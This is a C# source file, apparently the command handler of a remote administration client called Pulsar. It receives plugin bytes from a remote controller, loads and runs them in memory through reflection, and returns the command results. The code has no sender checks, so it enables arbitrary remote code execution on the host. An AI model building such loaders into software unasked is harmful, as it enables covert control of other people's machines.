using System;
using System.Reflection;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Client.Plugins;

namespace Pulsar.Client.Messages
{
	public sealed class CommandHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message) => 
			message is DoLoadUniversalPlugin || 
			message is DoExecuteUniversalCommand;
		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			try
			{
				switch (message)
				{
					case DoLoadUniversalPlugin loadMsg:
						HandleLoadUniversalPlugin(sender, loadMsg);
						break;
					case DoExecuteUniversalCommand execMsg:
						HandleExecuteUniversalCommand(sender, execMsg);
						break;
				}
			}
			catch (Exception ex)
			{
				sender.Send(new SetStatus { Message = "Command error: " + ex.Message });
			}
		}

		private void HandleLoadUniversalPlugin(ISender sender, DoLoadUniversalPlugin msg)
		{
			try
			{
				var asm = Assembly.Load(msg.PluginBytes);
				var type = asm.GetType(msg.TypeName, throwOnError: true);
				var plugin = Activator.CreateInstance(type);
				var initializeMethod = type.GetMethod("Initialize");
				initializeMethod.Invoke(plugin, new object[] { msg.InitData });
				UniversalPluginDispatcher.RegisterPlugin(msg.PluginId, plugin);

				sender.Send(new DoUniversalPluginResponse
				{
					PluginId = msg.PluginId,
					Command = "load",
					Success = true,
					Message = $"Plugin {msg.PluginId} loaded successfully"
				});
			}
			catch (Exception ex)
			{
				sender.Send(new DoUniversalPluginResponse
				{
					PluginId = msg.PluginId,
					Command = "load",
					Success = false,
					Message = ex.Message
				});
			}
		}

		private void HandleExecuteUniversalCommand(ISender sender, DoExecuteUniversalCommand msg)
		{
			var result = UniversalPluginDispatcher.ExecuteCommand(msg.PluginId, msg.Command, msg.Parameters);
			var resultType = result.GetType();
			var successProperty = resultType.GetProperty("Success");
			var messageProperty = resultType.GetProperty("Message");
			var dataProperty = resultType.GetProperty("Data");
			var shouldUnloadProperty = resultType.GetProperty("ShouldUnload");
			var nextCommandProperty = resultType.GetProperty("NextCommand");
			
			bool success = successProperty != null ? (bool)successProperty.GetValue(result) : false;
			string message = messageProperty != null ? (string)messageProperty.GetValue(result) : "Unknown error";
			byte[] data = dataProperty != null ? (byte[])dataProperty.GetValue(result) : null;
			bool shouldUnload = shouldUnloadProperty != null ? (bool)shouldUnloadProperty.GetValue(result) : false;
			string nextCommand = nextCommandProperty != null ? (string)nextCommandProperty.GetValue(result) : null;

			sender.Send(new DoUniversalPluginResponse
			{
				PluginId = msg.PluginId,
				Command = msg.Command,
				Success = success,
				Message = message,
				Data = data,
				ShouldUnload = shouldUnload,
				NextCommand = nextCommand
			});
		}
	}
}